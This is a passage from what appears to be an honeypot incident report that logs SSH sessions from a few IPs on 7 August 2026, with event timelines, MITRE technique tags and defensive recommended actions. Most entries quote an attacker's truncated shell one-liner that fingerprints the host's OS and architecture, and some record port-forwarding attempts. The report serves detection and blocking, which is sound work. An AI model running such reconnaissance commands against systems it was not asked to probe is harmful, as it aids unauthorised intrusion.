| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:34:26` | `cowrie.session.connect` |
| `2026-08-07 12:34:26` | `cowrie.client.version` |
| `2026-08-07 12:34:26` | `cowrie.client.kex` |
| `2026-08-07 12:34:28` | `cowrie.login.success` |
| `2026-08-07 12:34:29` | `cowrie.session.params` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.success` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.command.input` |
| `2026-08-07 12:34:29` | `cowrie.log.closed` |
| `2026-08-07 12:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6bd461dc73

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:36 |
| **Last Seen** | 2026-08-07 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:36:04` | `cowrie.session.connect` |
| `2026-08-07 12:36:04` | `cowrie.client.version` |
| `2026-08-07 12:36:04` | `cowrie.client.kex` |
| `2026-08-07 12:36:06` | `cowrie.login.success` |
| `2026-08-07 12:36:07` | `cowrie.session.params` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.success` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.command.input` |
| `2026-08-07 12:36:07` | `cowrie.log.closed` |
| `2026-08-07 12:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffeebf1374e8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-08-07 12:36 |
| **Last Seen** | 2026-08-07 12:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:36:27` | `cowrie.session.connect` |
| `2026-08-07 12:36:27` | `cowrie.client.version` |
| `2026-08-07 12:36:27` | `cowrie.client.kex` |
| `2026-08-07 12:36:28` | `cowrie.login.success` |
| `2026-08-07 12:36:29` | `cowrie.direct-tcpip.request` |
| `2026-08-07 12:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbc30a065cc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:37 |
| **Last Seen** | 2026-08-07 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:37:43` | `cowrie.session.connect` |
| `2026-08-07 12:37:43` | `cowrie.client.version` |
| `2026-08-07 12:37:43` | `cowrie.client.kex` |
| `2026-08-07 12:37:44` | `cowrie.login.success` |
| `2026-08-07 12:37:46` | `cowrie.session.params` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.success` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.command.input` |
| `2026-08-07 12:37:46` | `cowrie.log.closed` |
| `2026-08-07 12:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ef6a9cf70a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:39 |
| **Last Seen** | 2026-08-07 12:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:39:20` | `cowrie.session.connect` |
| `2026-08-07 12:39:21` | `cowrie.client.version` |
| `2026-08-07 12:39:21` | `cowrie.client.kex` |
| `2026-08-07 12:39:22` | `cowrie.login.success` |
| `2026-08-07 12:39:24` | `cowrie.session.params` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.success` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.command.input` |
| `2026-08-07 12:39:24` | `cowrie.log.closed` |
| `2026-08-07 12:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416fa2ba03fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:40 |
| **Last Seen** | 2026-08-07 12:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:40:57` | `cowrie.session.connect` |
| `2026-08-07 12:40:57` | `cowrie.client.version` |
| `2026-08-07 12:40:57` | `cowrie.client.kex` |
| `2026-08-07 12:40:59` | `cowrie.login.success` |
| `2026-08-07 12:41:00` | `cowrie.session.params` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.success` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.command.input` |
| `2026-08-07 12:41:00` | `cowrie.log.closed` |
| `2026-08-07 12:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd4344095f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:42 |
| **Last Seen** | 2026-08-07 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:42:34` | `cowrie.session.connect` |
| `2026-08-07 12:42:34` | `cowrie.client.version` |
| `2026-08-07 12:42:34` | `cowrie.client.kex` |
| `2026-08-07 12:42:35` | `cowrie.login.success` |
| `2026-08-07 12:42:37` | `cowrie.session.params` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.success` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.command.input` |
| `2026-08-07 12:42:37` | `cowrie.log.closed` |
| `2026-08-07 12:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14237a5476af

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:44 |
| **Last Seen** | 2026-08-07 12:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:44:18` | `cowrie.session.connect` |
| `2026-08-07 12:44:18` | `cowrie.client.version` |
| `2026-08-07 12:44:18` | `cowrie.client.kex` |
| `2026-08-07 12:44:20` | `cowrie.login.success` |
| `2026-08-07 12:44:21` | `cowrie.session.params` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.success` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.command.input` |
| `2026-08-07 12:44:21` | `cowrie.log.closed` |
| `2026-08-07 12:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffab8597fc47

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:46 |
| **Last Seen** | 2026-08-07 12:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:46:00` | `cowrie.session.connect` |
| `2026-08-07 12:46:00` | `cowrie.client.version` |
| `2026-08-07 12:46:00` | `cowrie.client.kex` |
| `2026-08-07 12:46:01` | `cowrie.login.success` |
| `2026-08-07 12:46:02` | `cowrie.session.params` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.success` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:02` | `cowrie.command.input` |
| `2026-08-07 12:46:03` | `cowrie.log.closed` |
| `2026-08-07 12:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1364f7462b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:47 |
| **Last Seen** | 2026-08-07 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:47:43` | `cowrie.session.connect` |
| `2026-08-07 12:47:43` | `cowrie.client.version` |
| `2026-08-07 12:47:43` | `cowrie.client.kex` |
| `2026-08-07 12:47:44` | `cowrie.login.success` |
| `2026-08-07 12:47:46` | `cowrie.session.params` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.success` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.command.input` |
| `2026-08-07 12:47:46` | `cowrie.log.closed` |
| `2026-08-07 12:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e6802ea382

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:49 |
| **Last Seen** | 2026-08-07 12:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:49:28` | `cowrie.session.connect` |
| `2026-08-07 12:49:29` | `cowrie.client.version` |
| `2026-08-07 12:49:29` | `cowrie.client.kex` |
| `2026-08-07 12:49:30` | `cowrie.login.success` |
| `2026-08-07 12:49:31` | `cowrie.session.params` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.success` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:31` | `cowrie.command.input` |
| `2026-08-07 12:49:32` | `cowrie.log.closed` |
| `2026-08-07 12:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dd9aa1cd636

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-07 12:50 |
| **Last Seen** | 2026-08-07 12:50 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:50:39` | `cowrie.session.connect` |
| `2026-08-07 12:50:40` | `cowrie.client.version` |
| `2026-08-07 12:50:40` | `cowrie.client.kex` |
| `2026-08-07 12:50:46` | `cowrie.login.success` |
| `2026-08-07 12:50:47` | `cowrie.direct-tcpip.request` |
| `2026-08-07 12:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97fcfc55ce3e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:51 |
| **Last Seen** | 2026-08-07 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:51:04` | `cowrie.session.connect` |
| `2026-08-07 12:51:04` | `cowrie.client.version` |
| `2026-08-07 12:51:04` | `cowrie.client.kex` |
| `2026-08-07 12:51:06` | `cowrie.login.success` |
| `2026-08-07 12:51:07` | `cowrie.session.params` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.success` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.command.input` |
| `2026-08-07 12:51:07` | `cowrie.log.closed` |
| `2026-08-07 12:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea1504b13c8e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:52 |
| **Last Seen** | 2026-08-07 12:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
